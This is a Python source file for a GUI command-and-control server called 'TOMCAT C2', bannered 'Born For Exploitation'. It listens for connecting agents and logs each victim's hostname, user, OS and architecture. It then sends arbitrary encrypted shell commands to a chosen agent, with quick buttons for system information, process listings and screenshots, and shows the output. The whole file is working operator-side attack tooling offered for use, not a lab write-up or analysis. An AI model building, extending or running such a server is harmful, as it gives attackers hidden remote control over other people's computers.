#!/usr/bin/python

try:
    import base64
    import colorama
    import cryptography.fernet
    import datetime
    import json
    import os
    import socket
    import sys
    import threading
    import time
    import tkinter as tk
    import traceback
    
    from colorama import Fore, init
    from cryptography.fernet import Fernet
    from datetime import datetime
    from sys import stdout
    from time import sleep
    from tkinter import font, messagebox, scrolledtext, ttk
except ModuleNotFoundError as e:
    print(f"REQUIRED MODULES NOT INSTALLED: {e}")
    sys.exit(0)

init(autoreset=True)


def xclear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


def animx(text):
    for c in text:
        stdout.write(c)
        stdout.flush()
        sleep(0.0008)
    print()


xbanner = f"""
{Fore.RED}
    ___________________      _____  _________     ________________ _________  ________
    \\__    ___/\\_____  \\    /     \\ \\_   ___ \\   /  _  \\__    ___/ \\_   ___ \\ \\_____  \\
      |    |    /   |   \\  /  \\ /  \\/    \\  \\/  /  /_\\  \\|    |    /    \\  \\/  /  ____/
      |    |   /    |    \\/    Y    \\     \\____/    |    \\    |    \\     \\____/       \\
      |____|   \\_______  /\\____|__  /\\______  /\\____|__  /____|     \\______  /\\_______ \\
                       \\/         \\/        \\/         \\/                  \\/         \\/
            {Fore.RED}~>> {Fore.WHITE} Author: TOM7
            {Fore.RED}~>> {Fore.WHITE} GitHub: tom7voldemort
            {Fore.RED}~>> {Fore.WHITE} Born For Exploitation
{Fore.RESET}
"""

hfont = "Helvetica"
mfont = "Courier"
color1 = "#000000"
color2 = "#242333"
color3 = "#0004ff"
color4 = "#ff0000"
color5 = "#ffffff"
color6 = "#0DFF00"


class C2Tomcat:
    def __init__(self, host="0.0.0.0", port=4444):
        self.host = host
        self.port = port
        self.agents = {}
        self.agentId = 0
        self.c2socket = None
        self.running = False
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.lock = threading.Lock()
        self.acceptThread = None

    def C2StartTomcat(self):
        try:
            self.c2socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.c2socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.c2socket.bind((self.host, self.port))
            self.c2socket.listen(5)
            self.running = True
            return True, f"SERVER START ON {self.host}:{self.port}"
        except Exception as e:
            return False, f"ERROR WILL STARTING SERVER: {str(e)}"

    def C2StopTomcat(self):
        self.running = False
        if self.c2socket:
            try:
                self.c2socket.close()
            except Exception:
                pass
        if self.acceptThread and self.acceptThread.is_alive():
            self.acceptThread.join(timeout=2)
        agentClose = []
        with self.lock:
            agentClose = list(self.agents.items())
        for agentId, agent in agentClose:
            try:
                agent["socket"].close()
            except Exception:
                pass
        with self.lock:
            self.agents.clear()

    def acceptConnection(self, callback):
        while self.running:
            try:
                self.c2socket.settimeout(1.0)
                agentSocket, address = self.c2socket.accept()
                thread = threading.Thread(
                    target=self.agentHandler,
                    args=(agentSocket, address, callback),
                    daemon=True,
                )
                thread.start()
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    callback("error", f"ERROR WILL ACCEPTING INFO: {str(e)}")

    def agentHandler(self, agentSocket, address, callback):
        currentAgentId = None
        try:
            agentSocket.settimeout(10)
            agentSocket.sendall(self.key)
            sleep(0.5)
            agentInfo = agentSocket.recv(4096).decode("utf-8")
            if not agentInfo:
                callback("error", "NO AGENT INFO RECEIVED")
                agentSocket.close()
                return
            info = json.loads(agentInfo)
            with self.lock:
                self.agentId += 1
                currentAgentId = self.agentId
                agentData = {
                    "socket": agentSocket,
                    "address": address,
                    "id": self.agentId,
                    "os": info.get("os", "Unknown"),
                    "hostname": info.get("hostname", "Unknown"),
                    "user": info.get("user", "Unknown"),
                    "arch": info.get("architecture", "Unknown"),
                    "joinAt": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                }
                self.agents[self.agentId] = agentData
            callback("newAgent", agentData)
            self.monitorAgent(currentAgentId, agentSocket, callback)
        except Exception as e:
            callback("error", f"HANDSHAKE ERROR: {str(e)}")
            try:
                agentSocket.close()
            except Exception:
                pass
            if currentAgentId:
                self.agentRefused(currentAgentId, callback)

    def monitorAgent(self, agentId, agentSocket, callback):
        try:
            while self.running:
                agentSocket.settimeout(5.0)
                try:
                    data = agentSocket.recv(1, socket.MSG_PEEK)
                    if not data:
                        raise ConnectionError("AGENT DISCONNECTED")
                except socket.timeout:
                    continue
                except Exception:
                    raise
                sleep(1)
        except Exception as e:
            callback("agentDisconnected", {"id": agentId, "reason": str(e)})
            self.agentRefused(agentId, callback)

    def agentAvailable(self, agentId, command):
        if agentId not in self.agents:
            return False, "AGENT NOT FOUND."
        try:
            agent = self.agents[agentId]
            agentSocket = agent["socket"]
            encrypted = self.cipher.encrypt(command.encode())
            agentSocket.settimeout(120)
            agentSocket.sendall(encrypted)
            recdata = b""
            starttime = time.time()
            while True:
                try:
                    if time.time() - starttime > 120:
                        return False, "COMMAND EXECUTION TIMEOUT (120s)"
                    chunk = agentSocket.recv(8192)
                    if not chunk:
                        raise ConnectionError(
                            "AGENT DISCONNECTED DURING COMMAND EXECUTION"
                        )
                    recdata += chunk
                    if recdata.endswith(b"<END>"):
                        recdata = recdata[:-5]
                        break
                except socket.timeout:
                    if recdata:
                        break
                    else:
                        return False, "NO RESPONSE FROM AGENT (timeout)"
            if recdata:
                try:
                    decrypted = self.cipher.decrypt(recdata).decode(
                        "utf-8", errors="ignore"
                    )
                    return True, decrypted
                except Exception as e:
                    return False, f"DECRYPTION ERROR: {str(e)}"
            else:
                return False, "NO RESPONSE FROM AGENT"
        except (ConnectionResetError, ConnectionError, BrokenPipeError) as e:
            self.agentRefused(agentId, None)
            return False, f"CONNECTION LOST: {str(e)}"
        except Exception as e:
            self.agentRefused(agentId, None)
            return False, f"ERROR: {str(e)}"

    def agentRefused(self, agentId, callback=None):
        with self.lock:
            if agentId in self.agents:
                try:
                    self.agents[agentId]["socket"].close()
                except Exception:
                    pass
                del self.agents[agentId]
                if callback:
                    callback("agentRemoved", {"id": agentId})

    def agentList(self):
        with self.lock:
            return list(self.agents.values())


class TOMCATC2GUI:
    def __init__(self, root):
        self.root = root
        self.root.title("TOMCAT C2 SERVER")
        self.root.geometry("1400x800")
        self.root.configure(bg=color1)
        self.server = None
        self.agentSelected = None
        self.currentSection = "DASHBOARD"
        self.setupUI()

    def setupUI(self):
        style = ttk.Style()
        style.theme_use("clam")

        navFrame = tk.Frame(self.root, bg=color2, bd=4, height=60, relief="ridge")
        navFrame.pack(fill="x", side="top")
        navFrame.pack_propagate(False)

        tk.Label(
            navFrame,
            bg=color2,
            fg=color4,
            font=(hfont, 24, "bold"),
            justify="center",
            text="TOMCAT C2 SERVER",
        ).pack(padx=5, pady=5, side="left")

        navButtons = tk.Frame(navFrame, bg=color2)
        navButtons.pack(padx=5, pady=5, side="right")

        sections = ["DASHBOARD", "SERVER", "AGENT LIST", "COMMAND", "LOGS"]
        
        self.navBtns = {}

        for section in sections:
            btn = tk.Button(
                navButtons,
                activebackground=color4,
                activeforeground=color1,
                bd=3,
                bg=color1,
                command=lambda s=section: self.switchSection(s),
                fg=color4,
                font=(hfont, 10, "bold"),
                justify="center",
                padx=2,
                pady=5,
                relief="ridge",
                text=section,
            )
            btn.pack(padx=5, pady=5, side="left")
            self.navBtns[section] = btn

        self.contentFrame = tk.Frame(self.root, bg=color1)
        self.contentFrame.pack(expand=True, fill="both", side="top")

        self.sections = {}
        self.createDashboard()
        self.createServerSection()
        self.createAgentListSection()
        self.createCommandSection()
        self.createLogsSection()

        statusBar = tk.Frame(self.root, bg=color2, bd=3, height=30)
        statusBar.pack(fill="x", side="bottom")
        statusBar.pack_propagate(False)

        self.statusLabel = tk.Label(
            statusBar,
            anchor="w",
            bg=color2,
            fg=color6,
            font=(hfont, 9),
            text="READY",
        )
        self.statusLabel.pack(padx=5, pady=5, side="left")

        tk.Label(
            statusBar,
            bg=color2,
            fg=color6,
            font=(hfont, 9, "italic"),
            justify="center",
            text="2025 CYBERTOM7 PROJECTS",
        ).pack(padx=5, pady=5, side="right")

        self.switchSection("DASHBOARD")

    def createDashboard(self):
        frame = tk.Frame(self.contentFrame, bg=color1)
        self.sections["DASHBOARD"] = frame

        contentWrapper = tk.Frame(frame, bg=color1)
        contentWrapper.pack(expand=True, padx=5, pady=2)

        bannerText = """
 ___________________      _____  _________     ________________ _________  ________
 \\__    ___/\\_____  \\    /     \\ \\_   ___ \\   /  _  \\__    ___/ \\_   ___ \\ \\_____  \\
   |    |    /   |   \\  /  \\ /  \\/    \\  \\/  /  /_\\  \\|    |    /    \\  \\/  /  ____/
   |    |   /    |    \\/    Y    \\     \\____/    |    \\    |    \\     \\____/       \\
   |____|   \\_______  /\\____|__  /\\______  /\\____|__  /____|     \\______  /\\_______ \\
                    \\/         \\/        \\/         \\/                  \\/         \\/
        """

        tk.Label(
            contentWrapper,
            bg=color1,
            fg=color4,
            font=(mfont, 10, "bold"),
            justify="left",
            text=bannerText,
        ).pack(padx=5, pady=2)

        infoContainer = tk.Frame(contentWrapper, bg=color1, bd=5, relief="ridge")
        infoContainer.pack(padx=5, pady=2)

        nameFrame = tk.Frame(infoContainer, bg=color2)
        nameFrame.pack(fill="x", padx=1, pady=1)

        tk.Label(
            nameFrame,
            bg=color2,
            fg=color4,
            font=(hfont, 14, "bold"),
            justify="center",
            text="TOOL INFORMATION",
        ).pack(padx=5, pady=2)

        infoFrame = tk.Frame(infoContainer, bg=color1)
        infoFrame.pack(padx=5, pady=2)

        info = [
            ("Author", "TOM7"),
            ("GitHub", "tom7voldemort"),
            ("Version", "1.0"),
            ("Framework", "Command & Control"),
            ("Interface", "GUI Based"),
        ]

        for label, value in info:
            row = tk.Frame(infoFrame, bg=color1)
            row.pack(fill="x", padx=1, pady=1)
            tk.Label(
                row,
                anchor="w",
                bg=color1,
                fg=color4,
                font=(hfont, 12, "bold"),
                text=f"{label}:",
                justify="center",
                width=15,
            ).pack(padx=1, pady=1, side="left")
            tk.Label(
                row,
                anchor="w",
                bg=color1,
                fg=color5,
                font=(hfont, 12),
                justify="center",
                text=value,
            ).pack(side="left", padx=1, pady=1)

        descFrame = tk.Frame(infoContainer, bg=color1)
        descFrame.pack(fill="x", padx=1, pady=1)

        tk.Label(
            descFrame,
            bg=color1,
            fg=color4,
            font=(hfont, 10, "italic"),
            justify="left",
            text="Navigate using the menu above to manage your C2 operations.\nControl your agents remotely with encrypted communications.",
        ).pack(padx=5, pady=5)

    def createServerSection(self):
        frame = tk.Frame(self.contentFrame, bg=color1)
        self.sections["SERVER"] = frame

        configFrame = tk.Frame(frame, bg=color2, bd=3, relief="ridge")
        configFrame.pack(fill="x", padx=5, pady=5)

        tk.Label(
            configFrame,
            bg=color2,
            fg=color4,
            font=(hfont, 12, "bold"),
            justify="center",
            text="SERVER CONFIGURATION",
        ).pack(padx=5, pady=2)

        hostFrame = tk.Frame(configFrame, bg=color2)
        hostFrame.pack(padx=5, pady=5)
        tk.Label(
            hostFrame,
            bg=color2,
            fg=color6,
            font=(hfont, 11, "bold"),
            justify="center",
            text="HOST:",
            width=10,
        ).pack(side="left", padx=5, pady=2)
        self.hostEntry = tk.Entry(
            hostFrame,
            bg=color1,
            fg=color6,
            font=(hfont, 11),
            insertbackground=color4,
            justify="center",
            width=30,
        )
        self.hostEntry.insert(0, "0.0.0.0")
        self.hostEntry.pack(side="left", padx=5, pady=2)

        portFrame = tk.Frame(configFrame, bg=color2)
        portFrame.pack(padx=5, pady=5)
        tk.Label(
            portFrame,
            bg=color2,
            fg=color6,
            font=(hfont, 11, "bold"),
            justify="center",
            text="PORT:",
            width=10,
        ).pack(padx=5, pady=2, side="left")
        self.portEntry = tk.Entry(
            portFrame,
            bg=color1,
            fg=color6,
            font=(hfont, 11),
            insertbackground=color4,
            justify="center",
            width=30,
        )
        self.portEntry.insert(0, "4444")
        self.portEntry.pack(padx=5, pady=2, side="left")

        buttonFrame = tk.Frame(configFrame, bg=color2)
        buttonFrame.pack(padx=5, pady=2)

        self.startBtn = tk.Button(
            buttonFrame,
            activebackground=color6,
            activeforeground=color1,
            bd=3,
            bg=color1,
            command=self.C2StartTomcat,
            fg=color6,
            font=(hfont, 11, "bold"),
            justify="center",
            padx=2,
            pady=5,
            relief="ridge",
            text="START SERVER",
        )
        self.startBtn.pack(padx=5, pady=5, side="left")

        self.stopBtn = tk.Button(
            buttonFrame,
            activebackground=color4,
            activeforeground=color1,
            bd=3,
            bg=color1,
            command=self.C2StopTomcat,
            fg=color4,
            font=(hfont, 11, "bold"),
            justify="center",
            padx=2,
            pady=5,
            relief="ridge",
            state="disabled",
            text="STOP SERVER",
        )
        self.stopBtn.pack(padx=5, pady=5, side="left")

        self.refreshBtn = tk.Button(
            buttonFrame,
            activebackground=color3,
            activeforeground=color1,
            bd=3,
            bg=color1,
            command=self.responseStatus,
            fg=color3,
            font=(hfont, 11, "bold"),
            justify="center",
            padx=2,
            pady=5,
            relief="ridge",
            text="REFRESH",
        )
        self.refreshBtn.pack(padx=5, pady=5, side="left")

        statusFrame = tk.Frame(frame, bd=3, bg=color2, relief="ridge")
        statusFrame.pack(fill="x", padx=5, pady=2)

        tk.Label(
            statusFrame,
            bg=color2,
            fg=color4,
            font=(hfont, 12, "bold"),
            justify="center",
            text="SERVER STATUS",
        ).pack(padx=5, pady=2)

        self.serverStatusLabel = tk.Label(
            statusFrame,
            bg=color2,
            fg=color4,
            font=(hfont, 16, "bold"),
            justify="center",
            text="OFFLINE",
        )
        self.serverStatusLabel.pack(padx=5, pady=2)

        self.serverInfoLabel = tk.Label(
            statusFrame,
            bg=color2,
            fg=color4,
            font=(hfont, 10),
            justify="center",
            text="SERVER NOT RUNNING",
        )
        self.serverInfoLabel.pack(padx=5, pady=2)

    def createAgentListSection(self):
        frame = tk.Frame(self.contentFrame, bg=color1)
        self.sections["AGENT LIST"] = frame

        self.agentCountLabel = tk.Label(
            frame,
            bg=color1,
            fg=color4,
            font=(hfont, 14, "bold"),
            justify="center",
            text="AGENTS CONNECTED: 0",
        )
        self.agentCountLabel.pack(padx=5, pady=2)

        treeFrame = tk.Frame(frame, bg=color1)
        treeFrame.pack(expand=True, fill="both", padx=5, pady=2)

        style = ttk.Style()
        style.configure(
            "Treeview",
            activebackground=color6,
            activeforeground=color1,
            background=color1,
            fieldbackground=color1,
            font=(hfont, 9),
            foreground=color6,
            justify="center",
        )
        style.configure(
            "Treeview.Heading",
            activebackground=color1,
            activeforeground=color6,
            background=color1,
            font=(hfont, 10, "bold"),
            foreground=color6,
            justify="center",
        )
        style.map(
            "Treeview",
            background=[("selected", color6)],
            foreground=[("selected", color1)],
            justify=[("selected", "center")],
        )

        cols = (
            "ID",
            "IP Address",
            "OS",
            "Hostname",
            "User",
            "Architecture",
            "Connected",
        )
        self.agentTree = ttk.Treeview(
            treeFrame, columns=cols, height=20, show="headings"
        )

        widths = {
            "ID": 60,
            "IP Address": 150,
            "OS": 100,
            "Hostname": 180,
            "User": 120,
            "Architecture": 120,
            "Connected": 160,
        }

        for col in cols:
            self.agentTree.heading(col, text=col)
            self.agentTree.column(col, width=widths[col])

        scrollbar = ttk.Scrollbar(
            treeFrame, command=self.agentTree.yview, orient="vertical"
        )

        self.agentTree.configure(yscrollcommand=scrollbar.set)
        self.agentTree.pack(expand=True, fill="both", padx=5, pady=2, side="left")
        
        scrollbar.pack(fill="y", padx=5, pady=2, side="right")

        self.agentTree.bind("<ButtonRelease-1>", self.executor)

    def createCommandSection(self):
        frame = tk.Frame(self.contentFrame, bg=color1)
        self.sections["COMMAND"] = frame

        contentWrapper = tk.Frame(frame, bg=color1)
        contentWrapper.pack(expand=True, fill="both", padx=5, pady=2)

        self.selectedAgentLabel = tk.Label(
            contentWrapper,
            bg=color1,
            fg=color4,
            font=(hfont, 14, "bold"),
            justify="center",
            text="NO AGENT SELECTED",
        )
        self.selectedAgentLabel.pack(padx=5, pady=2)

        quickFrame = tk.Frame(contentWrapper, bg=color2, bd=3, relief="ridge")
        quickFrame.pack(fill="x", padx=5, pady=2)

        tk.Label(
            quickFrame,
            bg=color2,
            fg=color6,
            font=(hfont, 13, "bold"),
            justify="center",
            text="QUICK COMMANDS",
        ).pack(padx=5, pady=2)

        cmdButtonFrame = tk.Frame(quickFrame, bg=color2)
        cmdButtonFrame.pack(padx=5, pady=2)

        commands = [
            ("SYSTEM INFORMATION", "SYSINFO"),
            ("LIST FILES", "ls -la" if os.name != "nt" else "dir"),
            ("NETWORK", "ip addr" if os.name != "nt" else "ipconfig"),
            ("USER INFORMATION", "whoami"),
            ("PROCESSES", "ps aux" if os.name != "nt" else "tasklist"),
            ("SCREENSHOT", "SCREENSHOT"),
        ]

        for text, cmd in commands:
            btn = tk.Button(
                cmdButtonFrame,
                activebackground=color6,
                activeforeground=color1,
                bd=3,
                bg=color1,
                command=lambda c=cmd: self.quickCmd(c),
                fg=color6,
                font=(hfont, 10, "bold"),
                justify="center",
                padx=2,
                pady=5,
                relief="ridge",
                text=text,
            )
            btn.pack(padx=5, pady=5, side="left")

        outputFrame = tk.Frame(contentWrapper, bg=color2, bd=3, relief="ridge")
        outputFrame.pack(padx=5, pady=5, fill="both", expand=True)

        tk.Label(
            outputFrame,
            bg=color2,
            fg=color6,
            font=(hfont, 12, "bold"),
            justify="center",
            text="COMMAND OUTPUT",
        ).pack(padx=5, pady=2)

        self.cmdOutput = scrolledtext.ScrolledText(
            outputFrame,
            bg=color1,
            fg=color6,
            font=(hfont, 9),
            height=10,
            insertbackground=color4,
            relief="ridge",
            wrap="word",
        )
        self.cmdOutput.pack(expand=True, fill="both", padx=5, pady=5)

        inputFrame = tk.Frame(contentWrapper, bg=color2, bd=3, relief="ridge")
        inputFrame.pack(padx=5, pady=2, fill="x")

        tk.Label(
            inputFrame,
            bg=color2,
            fg=color6,
            font=(hfont, 13, "bold"),
            justify="center",
            text="CUSTOM COMMAND",
        ).pack(padx=5, pady=5)

        cmdInputFrame = tk.Frame(inputFrame, bg=color2)
        cmdInputFrame.pack(fill="x", padx=5, pady=5)

        self.cmdEntry = tk.Entry(
            cmdInputFrame,
            bg=color1,
            fg=color6,
            font=(hfont, 12),
            justify="left",
            insertbackground=color4,
        )
        self.cmdEntry.pack(expand=True, fill="x",ipadx=10, ipady=10, padx=5, pady=2, side="left")
        self.cmdEntry.bind("<Return>", lambda e: self.execCmd())

        tk.Button(
            cmdInputFrame,
            activebackground=color6,
            activeforeground=color1,
            bd=3,
            bg=color1,
            command=self.execCmd,
            fg=color6,
            font=(hfont, 11, "bold"),
            justify="center",
            padx=2,
            pady=5,
            relief="ridge",
            text="EXECUTE",
        ).pack(padx=5, pady=2, side="left")

        tk.Button(
            cmdInputFrame,
            activebackground=color6,
            activeforeground=color1,
            bd=3,
            bg=color1,
            command=self.clearCmdOutput,
            fg=color6,
            font=(hfont, 11, "bold"),
            justify="center",
            padx=2,
            pady=5,
            relief="ridge",
            text="CLEAR",
        ).pack(padx=5, pady=2, side="left")

    def createLogsSection(self):
        frame = tk.Frame(self.contentFrame, bg=color1)
        self.sections["LOGS"] = frame

        logFrame = tk.Frame(frame, bg=color2, bd=3, relief="ridge")
        logFrame.pack(expand=True, fill="both", padx=5, pady=2)

        headerFrame = tk.Frame(logFrame, bg=color2)
        headerFrame.pack(fill="x")

        tk.Label(
            headerFrame,
            bg=color2,
            fg=color6,
            font=(hfont, 12, "bold"),
            justify="center",
            text="ACTIVITY LOG",
        ).pack(padx=5, pady=2, side="left")

        tk.Button(
            headerFrame,
            activebackground=color6,
            activeforeground=color1,
            bd=3,
            bg=color1,
            command=self.clearLogs,
            fg=color6,
            font=(hfont, 9, "bold"),
            justify="center",
            padx=2,
            pady=5,
            relief="ridge",
            text="CLEAR LOGS",
        ).pack(padx=5, pady=2, side="right")

        self.logOutput = scrolledtext.ScrolledText(
            logFrame,
            bg=color1,
            fg=color6,
            font=(hfont, 10),
            insertbackground=color4,
            relief="ridge",
        )
        self.logOutput.pack(expand=True, fill="both", padx=5, pady=2)

        self.log("TOMCAT C2 SERVER\n")
        self.log("Author: TOM7\n")
        self.log("GitHub: tom7voldemort\n")
        self.log("Version: 1.0\n")
        self.log("Born For Exploitation\n")

    def switchSection(self, section):
        for name, frame in self.sections.items():
            frame.pack_forget()

        self.sections[section].pack(expand=True, fill="both")
        self.currentSection = section

        for name, btn in self.navBtns.items():
            if name == section:
                btn.config(bg=color4, fg=color1)
            else:
                btn.config(bg=color1, fg=color4)

    def C2StartTomcat(self):
        host = self.hostEntry.get()
        port = int(self.portEntry.get())
        self.server = C2Tomcat(host, port)
        success, message = self.server.C2StartTomcat()
        if success:
            self.log(f"[+] {message}\n")
            self.log(f"[+] SESSION KEY: {self.server.key.decode()}\n\n")
            self.serverStatusLabel.config(text="ONLINE", fg=color6)
            self.serverInfoLabel.config(text=f"LISTENING ON {host}:{port}", fg=color6)
            self.startBtn.config(state="disabled")
            self.stopBtn.config(state="normal")
            self.statusLabel.config(text=f"SERVER ONLINE: {host}:{port}", fg=color6)
            self.server.acceptThread = threading.Thread(
                target=self.server.acceptConnection, args=(self.c2handler,), daemon=True
            )
            self.server.acceptThread.start()
        else:
            messagebox.showerror("ERROR", message)
            self.log(f"[!] {message}\n")

    def C2StopTomcat(self):
        if self.server:
            self.log("[!] STOPPING SERVER\n")
            self.server.C2StopTomcat()
            self.log("[!] SERVER STOPPED\n\n")
            self.serverStatusLabel.config(text="OFFLINE", fg=color4)
            self.serverInfoLabel.config(text="SERVER NOT RUNNING", fg=color4)
            self.startBtn.config(state="normal")
            self.stopBtn.config(state="disabled")
            self.agentTree.delete(*self.agentTree.get_children())
            self.agentCountLabel.config(text="AGENTS CONNECTED: 0", fg=color4)
            self.statusLabel.config(text="SERVER STOPPED", fg=color4)
            self.agentSelected = None
            self.selectedAgentLabel.config(text="NO AGENT SELECTED", fg=color4)

    def c2handler(self, c2event, data):
        if c2event == "newAgent":
            self.root.after(0, self.AddAgent, data)
            self.root.after(
                0,
                self.log,
                f"\n[+] NEW AGENT CONNECTED\n"
                f"~>> ID: {data['id']}\n"
                f"~>> Hostname: {data['hostname']}\n"
                f"~>> Address: {data['address'][0]}:{data['address'][1]}\n"
                f"~>> OS: {data['os']}\n"
                f"~>> User: {data['user']}\n"
                f"~>> Arch: {data['arch']}\n\n",
            )
        elif c2event == "agentDisconnected":
            self.root.after(0, self.removeAgent, data["id"])
            self.root.after(
                0,
                self.log,
                f"\n[!] AGENT DISCONNECTED\n"
                f"~>> ID: {data['id']}\n"
                f"~>> REASON: {data.get('reason', 'Unknown')}\n\n",
            )
        elif c2event == "agentRemoved":
            self.root.after(0, self.removeAgent, data["id"])
        elif c2event == "error":
            self.root.after(0, self.log, f"[!] {data}\n")

    def AddAgent(self, agent):
        self.agentTree.insert(
            "",
            tk.END,
            values=(
                agent["id"],
                f"{agent['address'][0]}:{agent['address'][1]}",
                agent["os"],
                agent["hostname"],
                agent["user"],
                agent["arch"],
                agent["joinAt"],
            ),
            tags=(str(agent["id"]),),
        )
        count = len(self.agentTree.get_children())
        self.agentCountLabel.config(text=f"AGENTS CONNECTED: {count}", fg=color6)

    def removeAgent(self, agentId):
        for item in self.agentTree.get_children():
            values = self.agentTree.item(item)["values"]
            if values[0] == agentId:
                self.agentTree.delete(item)
                break
        count = len(self.agentTree.get_children())
        self.agentCountLabel.config(text=f"AGENTS CONNECTED: {count}", fg=color4)
        if self.agentSelected == agentId:
            self.agentSelected = None
            self.selectedAgentLabel.config(text="NO AGENT SELECTED", fg=color4)
            self.statusLabel.config(
                text="AGENT DISCONNECTED - SELECT ANOTHER", fg=color4
            )

    def executor(self, event):
        selection = self.agentTree.selection()
        if selection:
            item = self.agentTree.item(selection[0])
            self.agentSelected = int(item["values"][0])
            self.log(f"[+] SELECTED AGENT ID: {self.agentSelected}\n")
            self.selectedAgentLabel.config(
                text=f"AGENT {self.agentSelected} SELECTED", fg=color6
            )
            self.statusLabel.config(
                text=f"SELECTED: AGENT {self.agentSelected}", fg=color6
            )

    def execCmd(self):
        if not self.agentSelected:
            messagebox.showwarning("WARNING", "SELECT AN AGENT FIRST!")
            return
        command = self.cmdEntry.get().strip()
        if not command:
            return
        self.log(f"[+] AGENT {self.agentSelected} | EXECUTING >> {command}\n")
        self.cmdOutput.insert(tk.END, f"[+] EXECUTING >> {command}\n")
        self.cmdOutput.see(tk.END)
        self.statusLabel.config(text=f"EXECUTING: {command}")
        thread = threading.Thread(target=self.execThread, args=(command,), daemon=True)
        thread.start()
        self.cmdEntry.delete(0, tk.END)

    def execThread(self, command):
        success, response = self.server.agentAvailable(self.agentSelected, command)
        self.root.after(0, self.execResults, success, response, command)

    def execResults(self, success, response, command):
        if success:
            self.log(f"[+] OUTPUT:\n{response}\n")
            self.cmdOutput.insert(tk.END, f"[+] OUTPUT:\n{response}\n")
            self.cmdOutput.see(tk.END)
        else:
            self.log(f"[!] ERROR: {response}\n")
            self.cmdOutput.insert(tk.END, f"[!] ERROR: {response}\n\n")
            self.cmdOutput.see(tk.END)
            self.responseStatus()
        self.statusLabel.config(text="READY", fg=color6)

    def quickCmd(self, command):
        if not self.agentSelected:
            messagebox.showwarning("WARNING", "SELECT AN AGENT FIRST!")
            return
        self.cmdEntry.delete(0, tk.END)
        self.cmdEntry.insert(0, command)
        self.execCmd()

    def responseStatus(self):
        self.agentTree.delete(*self.agentTree.get_children())
        if self.server:
            for agent in self.server.agentList():
                self.AddAgent(agent)

    def clearCmdOutput(self):
        self.cmdOutput.delete(1.0, tk.END)

    def clearLogs(self):
        self.logOutput.delete(1.0, tk.END)
        self.log("~>>")

    def log(self, message):
        self.logOutput.insert(tk.END, message)
        self.logOutput.see(tk.END)


def main():
    root = tk.Tk()
    app = TOMCATC2GUI(root)
    root.mainloop()


if __name__ == "__main__":
    xclear()
    animx(xbanner)
    main()
